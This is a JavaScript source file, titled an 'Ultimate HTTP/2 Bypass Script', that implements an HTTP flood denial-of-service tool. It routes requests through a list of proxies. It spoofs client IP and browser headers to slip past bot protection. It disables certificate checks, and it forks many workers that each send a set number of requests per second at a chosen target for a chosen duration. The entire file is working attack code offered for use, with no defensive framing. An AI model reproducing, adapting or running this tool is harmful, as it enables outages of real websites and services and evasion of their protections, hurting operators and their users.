// bypass-vip.js - Ultimate HTTP/2 Bypass Script

const net = require("net");
const tls = require("tls");
const fs = require("fs");
const url = require("url");
const crypto = require("crypto");
const cluster = require("cluster");
const { HeaderGenerator } = require("header-generator");
const { exec } = require("child_process");
require("events").EventEmitter.defaultMaxListeners = 0;

// === ARGS ===
if (process.argv.length < 7) {
    console.log("Usage: node tls-new.js <GET/POST> <target> <duration> <threads> <rate> <proxyfile>");
    process.exit(0);
}

const method = process.argv[2];
const target = process.argv[3];
const duration = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);
const proxyFile = process.argv[7];

const proxies = fs.readFileSync(proxyFile, "utf-8").toString().split("\n").filter(p => p.trim());
const parsedTarget = new URL(target);

const headerGenerator = new HeaderGenerator({
    browsers: [{ name: "chrome", minVersion: 90, maxVersion: 120 }],
    devices: ["desktop"],
    operatingSystems: ["windows", "linux", "macos"],
    locales: ["en-US", "en"]
});

const randstr = len => [...Array(len)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * 62))).join("");
const spoofIP = () => Array(4).fill().map(() => Math.floor(Math.random() * 255)).join(".");

function buildHeaders() {
    const headers = headerGenerator.getHeaders();
    headers["x-forwarded-for"] = spoofIP();
    headers["x-real-ip"] = spoofIP();
    headers["referer"] = parsedTarget.origin;
    headers["origin"] = parsedTarget.origin;
    return headers;
}

function buildPayload() {
    const path = parsedTarget.pathname + parsedTarget.search;
    const headers = buildHeaders();
    let raw = `${method} ${path} HTTP/1.1\r\nHost: ${parsedTarget.host}\r\n`;
    for (const key in headers) {
        raw += `${key}: ${headers[key]}\r\n`;
    }
    raw += `Connection: Keep-Alive\r\n\r\n`;
    return Buffer.from(raw, "utf-8");
}

function attack() {
    const proxy = proxies[Math.floor(Math.random() * proxies.length)].split(":");
    const [host, port] = [proxy[0], parseInt(proxy[1])];
    const socket = net.connect(port, host, () => {
        const connectReq = `CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\nConnection: keep-alive\r\n\r\n`;
        socket.write(connectReq);
    });

    socket.once("data", () => {
        const tlsSocket = tls.connect({
            socket,
            servername: parsedTarget.hostname,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: crypto.constants.defaultCoreCipherList,
            rejectUnauthorized: false
        }, () => {
            const payload = buildPayload();
            function flood() {
                for (let i = 0; i < rate; i++) {
                    tlsSocket.write(payload);
                }
            }
            setInterval(flood, 1000);
        });

        tlsSocket.on("error", () => tlsSocket.destroy());
    });

    socket.on("error", () => socket.destroy());
}

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(1), duration * 1000);
} else {
    setInterval(attack, 100);
}
